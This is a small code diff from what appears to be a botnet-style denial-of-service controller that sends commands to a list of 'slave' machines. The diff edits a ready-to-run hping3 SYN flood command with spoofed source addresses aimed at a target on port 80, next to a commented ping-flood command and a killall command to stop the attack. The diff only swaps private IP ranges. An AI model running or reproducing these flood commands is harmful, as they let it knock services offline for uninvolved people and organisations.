@@ -10,9 +10,9 @@ slaves = [
 
 # Syn flood attack
 # How set up $(sudo hping3 --flood -S --spoof {spoof IPV4} {victem IPV4} - {PortNumber})
-command = "sudo hping3 --flood -S --spoof 10.0.0.0 10.0.0.145 -p 80"
+command = "sudo hping3 --flood -S --spoof 10.69.69.0 10.69.69.145 -p 80"
 # Ping flood attack
-#command = "sudo hping3 --flood -1 10.69.69.113"
+#command = "sudo hping3 --flood -1 10.69.69.113
 
 # Command to stop attack by killing all instances
 stop_command = "sudo killall hping3"
